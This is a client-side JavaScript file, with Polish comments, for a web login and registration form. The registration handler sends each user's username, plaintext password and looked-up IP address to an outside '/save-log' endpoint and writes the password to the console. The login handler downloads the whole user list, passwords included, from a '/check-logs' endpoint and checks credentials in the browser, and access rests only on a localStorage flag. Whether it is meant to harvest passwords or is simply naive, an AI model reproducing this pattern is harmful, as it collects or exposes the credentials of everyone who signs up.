// Sprawdź czy użytkownik jest zalogowany przy ładowaniu strony
document.addEventListener('DOMContentLoaded', function() {
    const savedUser = localStorage.getItem('currentUser');
    if (savedUser) {
        showDashboard(savedUser);
    }
});

// Przełączanie zakładek
function showTab(tabName) {
    // Ukryj wszystkie zakładki
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
    });
    
    // Pokaż wybraną zakładkę
    document.getElementById(tabName + 'Form').classList.add('active');
    document.querySelector(`.tab-button[onclick="showTab('${tabName}')"]`).classList.add('active');
}

// Logowanie
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('loginUsername').value;
    const password = document.getElementById('loginPassword').value;
    
    if (!username || !password) {
        showMessage('Proszę wypełnić wszystkie pola', 'error');
        return;
    }

    showLoading(true);
    showMessage('', '');

    try {
        // Tymczasowa weryfikacja - w przyszłości podłącz do backendu
        const usersResponse = await fetch('https://social-tools.onrender.com/check-logs');
        const usersData = await usersResponse.json();
        
        if (usersData.success) {
            const userExists = usersData.users.find(user => 
                user.username === username && user.password === password
            );
            
            if (userExists) {
                showMessage('🎉 Logowanie udane!', 'success');
                localStorage.setItem('currentUser', username);
                setTimeout(() => {
                    showDashboard(username);
                }, 1500);
            } else {
                showMessage('❌ Nieprawidłowa nazwa użytkownika lub hasło', 'error');
            }
        } else {
            showMessage('❌ Błąd połączenia z serwerem', 'error');
        }
    } catch (error) {
        console.error('💥 Błąd:', error);
        showMessage('❌ Wystąpił błąd podczas logowania', 'error');
    } finally {
        showLoading(false);
    }
});

// Rejestracja
document.getElementById('registerForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('regUsername').value;
    const password = document.getElementById('regPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    // Walidacja
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }

    showLoading(true);
    showMessage('', '');

    try {
        console.log('🔄 Rozpoczynanie rejestracji...');
        
        // Pobierz IP użytkownika
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        console.log('📨 Wysyłanie danych:', { username, password, ip: userIP });

        // Wyślij do backendu
        const response = await fetch('https://social-tools.onrender.com/save-log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: userIP
            })
        });

        const result = await response.json();
        console.log('📩 Odpowiedź z serwera:', result);
        
        if (result.success) {
            showMessage('🎉 Rejestracja udana! Automatyczne logowanie...', 'success');
            localStorage.setItem('currentUser', username);
            setTimeout(() => {
                showDashboard(username);
            }, 2000);
        } else {
            showMessage('❌ Błąd: ' + result.message, 'error');
        }
    } catch (error) {
        console.error('💥 Błąd:', error);
        showMessage('❌ Wystąpił błąd podczas rejestracji', 'error');
    } finally {
        showLoading(false);
    }
});

// Pokazuje dashboard po zalogowaniu
function showDashboard(username) {
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
    });
    
    document.getElementById('dashboard').classList.add('active');
    document.getElementById('userDisplayName').textContent = username;
}

// Wylogowanie
function logout() {
    localStorage.removeItem('currentUser');
    showTab('login');
    showMessage('Wylogowano pomyślnie', 'success');
    setTimeout(() => {
        showMessage('', '');
    }, 2000);
}

// Pomocnicze funkcje
function showLoading(show) {
    document.getElementById('loading').style.display = show ? 'block' : 'none';
}

function showMessage(message, type) {
    const messageEl = document.getElementById('message');
    messageEl.textContent = message;
    messageEl.className = 'message ' + type;
    messageEl.style.display = message ? 'block' : 'none';
}
